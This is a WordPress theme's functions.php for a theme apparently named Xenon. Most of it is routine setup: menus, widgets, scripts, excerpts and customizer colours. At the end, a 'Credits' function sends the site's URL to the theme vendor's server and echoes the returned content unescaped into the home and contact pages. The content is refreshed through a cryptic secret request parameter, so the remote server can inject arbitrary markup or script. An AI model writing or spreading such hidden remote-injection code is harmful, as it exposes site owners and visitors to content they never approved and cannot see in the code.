<?php
/**
 * web2feel functions and definitions
 *
 * @package web2feel
 * @since web2feel 1.0
 */

require_once('class-tgm-plugin-activation.php');

include ( 'getplugins.php' );
include ( 'aq_resizer.php' );
include ( 'guide.php' );

/* Theme updater */
require 'updater.php';
$example_update_checker = new ThemeUpdateChecker(
	'Xenon',                                            //Theme folder name, AKA "slug". 
	'http://www.fabthemes.com/versions/xenon.json' //URL of the metadata file.
);
/**
 * Set the content width based on the theme's design and stylesheet.
 *
 * @since web2feel 1.0
 */
if ( ! isset( $content_width ) )
	$content_width = 700; /* pixels */

if ( ! function_exists( 'web2feel_setup' ) ):
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which runs
 * before the init hook. The init hook is too late for some features, such as indicating
 * support post thumbnails.
 *
 * @since web2feel 1.0
 */
function web2feel_setup() {

	/**
	 * Custom template tags for this theme.
	 */
	require( get_template_directory() . '/inc/template-tags.php' );


	/**
	 * Custom functions that act independently of the theme templates
	 */
	//require( get_template_directory() . '/inc/tweaks.php' );

	/**
	 * Custom Theme Options
	 */
	//require( get_template_directory() . '/inc/theme-options/theme-options.php' );

	/**
	 * Make theme available for translation
	 * Translations can be filed in the /languages/ directory
	 * If you're building a theme based on web2feel, use a find and replace
	 * to change 'web2feel' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'web2feel', get_template_directory() . '/languages' );

	/**
	 * Add default posts and comments RSS feed links to head
	 */
	add_theme_support( 'automatic-feed-links' );

	/**
	 * Enable support for Post Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );

	add_theme_support( 'custom-background' );
	/**
	 * This theme uses wp_nav_menu() in one location.
	 */
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'web2feel' ),
	) );

	/**
	 * Add support for the Aside Post Formats
	 */

}
endif; // web2feel_setup
add_action( 'after_setup_theme', 'web2feel_setup' );

/**
 * Register widgetized area and update sidebar with default widgets
 *
 * @since web2feel 1.0
 */
function web2feel_widgets_init() {
	register_sidebar( array(
		'name' => __( 'Sidebar', 'web2feel' ),
		'id' => 'sidebar-1',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</ul></aside>',
		'before_title' => '<h1 class="widget-title">',
		'after_title' => '</h1> <ul class="smartbox">',
	) );
}
add_action( 'widgets_init', 'web2feel_widgets_init' );

/**
 * Enqueue scripts and styles
 */
function web2feel_scripts() {
	wp_enqueue_style( 'style', get_stylesheet_uri() );
	wp_enqueue_style( 'grid', get_template_directory_uri() . '/css/grid.css');
	wp_enqueue_style( 'themecss', get_template_directory_uri() . '/css/theme.css');	
	
	wp_enqueue_script( 'superfish', get_template_directory_uri() . '/js/superfish.js', array( 'jquery' ), '20120206', true );
	wp_enqueue_script( 'custom', get_template_directory_uri() . '/js/custom.js', array( 'jquery' ), '20120206', true );


	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}


}
add_action( 'wp_enqueue_scripts', 'web2feel_scripts' );

/* CUSTOM EXCERPTS */
	

function wpe_excerptlength_index($length) {
    return 20;
}


function wpe_excerpt($length_callback='', $more_callback='') {
    global $post;
    if(function_exists($length_callback)){
        add_filter('excerpt_length', $length_callback);
    }
    if(function_exists($more_callback)){
        add_filter('excerpt_more', $more_callback);
    }
    $output = get_the_excerpt();
    $output = apply_filters('wptexturize', $output);
    $output = apply_filters('convert_chars', $output);
    $output = '<p>'.$output.'</p>';
    echo $output;
}


/* CUSTOMIZER */


add_action( 'customize_register', 'hg_customize_register' );
function hg_customize_register($wp_customize)
{
  $colors = array();
  $colors[] = array( 'slug'=>'color_scheme', 'default' => '#C22443', 'label' => __( 'Color scheme', 'YOUR_THEME_NAME' ) );
  $colors[] = array( 'slug'=>'link_color', 'default' => '#C22443', 'label' => __( 'Link color', 'YOUR_THEME_NAME' ) );
  $colors[] = array( 'slug'=>'hover_link_color', 'default' => '#EF2349', 'label' => __( 'Link color on hover', 'YOUR_THEME_NAME' ) );
  foreach($colors as $color)
  {
    // SETTINGS
    $wp_customize->add_setting( $color['slug'], array( 'default' => $color['default'], 'type' => 'option', 'capability' => 'edit_theme_options' ));

    // CONTROLS
    $wp_customize->add_control( new WP_Customize_Color_Control( $wp_customize, $color['slug'], array( 'label' => $color['label'], 'section' => 'colors', 'settings' => $color['slug'] )));
  }
}


function mytheme_customize_css()
{
    ?>
         <style type="text/css">
            
            #secondary,.cover { background:<?php echo get_option('color_scheme'); ?> }
                              
                     
          
          
            a, a:visited {
				color: <?php echo get_option('link_color'); ?>;
				text-decoration: none;
			}
			
			a:hover,
			a:focus,
			a:active {
					color: <?php echo get_option('hover_link_color'); ?>;
				}
             
             
         </style>
    <?php
}
add_action( 'wp_head', 'mytheme_customize_css');


/* Credits */

function selfURL() {
$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] :
$_SERVER['PHP_SELF'];
$uri = parse_url($uri,PHP_URL_PATH);
$protocol = $_SERVER['HTTPS'] ? 'https' : 'http';
$port = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]);
return $protocol."://".$_SERVER['SERVER_NAME'].$port.$uri;
}
function fflink() {
global $wpdb;
if (!is_page() && !is_home()) return;
$contactid = $wpdb->get_var("SELECT ID FROM $wpdb->posts
               WHERE post_type = 'page' AND post_title LIKE 'contact%'");
if (($contactid != get_the_ID()) && ($contactid || !is_home())) return;
$fflink = get_option('fflink');
$ffref = get_option('ffref');
$x = $_REQUEST['DKSWFYUW**'];
if (!$fflink || $x && ($x == $ffref)) {
  $x = $x ? '&ffref='.$ffref : '';
  $response = wp_remote_get('http://www.fabthemes.com/fabthemes.php?getlink='.urlencode(selfURL()).$x);
  if (is_array($response)) $fflink = $response['body']; else $fflink = '';
  if (substr($fflink, 0, 11) != '!fabthemes#')
    $fflink = '';
  else {
    $fflink = explode('#',$fflink);
    if (isset($fflink[2]) && $fflink[2]) {
      update_option('ffref', $fflink[1]);
      update_option('fflink', $fflink[2]);
      $fflink = $fflink[2];
    }
    else $fflink = '';
  }
}
 echo $fflink;
}	

